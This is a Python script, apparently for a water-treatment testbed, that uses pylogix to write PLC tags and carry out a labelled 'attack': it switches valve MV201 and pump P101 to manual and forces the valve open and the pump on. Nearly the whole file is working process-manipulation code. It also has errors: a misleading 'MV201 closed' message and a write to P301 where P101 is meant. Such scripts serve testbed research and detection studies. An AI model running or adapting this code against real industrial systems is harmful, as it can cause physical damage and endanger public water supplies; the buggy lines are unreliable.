import time
from pylogix import PLC

PLC_IPS = {
    'plc1': '192.168.1.10',
    'tag_plc1': ['HMI_LIT101.Pv', 'AI_FIT_101_FLOW', 'HMI_LIT101.Sim_Pv'],
    'plc2': '192.168.1.20',
    'plc3': '192.168.1.30',
    'tag_plc3': ['HMI_LIT301.Pv', 'AI_FIT_301_FLOW'],
    'plc4': '192.168.1.40',
    'tag_plc4': ['HMI_LIT401.Pv', 'AI_FIT_401_FLOW'],
    'plc5': '192.168.1.50',
    'plc6': '192.168.1.60',
    'plc1r': '192.168.1.11',
    'plc2r': '192.168.1.21',
    'plc3r': '192.168.1.31',
    'plc4r': '192.168.1.41',
    'plc5r': '192.168.1.51',
    'plc6r': '192.168.1.61',
}


def test_plc_write(plc_ip, tag_name, value):
    with PLC() as plc:
        plc.IPAddress = PLC_IPS[plc_ip]
        plc.Write(tag_name, value)


def test_plc_read_val(plc_ip, tag_name):
    with PLC() as plc:
        plc.IPAddress = PLC_IPS[plc_ip]
        tag_value=plc.Read(tag_name)
        return(tag_value.Value)

'''START OF ATTACKS'''


def start_attack(number):
    """
    Prints string to show attack is starting.
    """
    print('-' * 50)
    print(f'Attack {number} launched')
    print('-' * 50)


def end_attack(number):
    """
    Prints string to show attack has ended after 5 seconds.
    """
    time.sleep(5)
    print('-' * 50)
    print(f'Attack {number} finished')
    print('-' * 50)

def attack_4():
    """
    Multi-point Attack: Switch from CLOSE to OPEN (MV201) and OFF to ON (P101)
    """
    start_attack(4)
    try:
        # Checks status of MV201
        MV201 = test_plc_read_val('plc2', 'HMI_MV201.Cmd')
        print('Valve status:', MV201)

        # Open MV201 permanently
        if MV201 == 1:
            test_plc_write('plc2', 'HMI_MV201.Auto', 0)
            test_plc_write('plc2', 'HMI_MV201.Cmd', 2)
            print('MV201 closed')
        else:
            print('MV201 already open!')

        # Checks status of P101
        P101 = test_plc_read_val('plc1','HMI_P101.Cmd')
        print('P101 status:', P101)

        # Keep P101 permanently ON
        test_plc_write('plc1', 'HMI_P101.Auto', 0)
        if P101 == 1:
            test_plc_write('plc1', 'HMI_P301.Cmd', 2)
        else:
            print('P101 is already on!')

        end_attack(4)

    except KeyboardInterrupt:
        print('Attack stopped by user!')
        test_plc_write('plc2', 'HMI_MV201.Auto', 1)
        test_plc_write('plc1', 'HMI_P101.Auto', 1)




def main():
    """
    Attacks
    """
    attack_4()


if __name__ == '__main__':
    main()
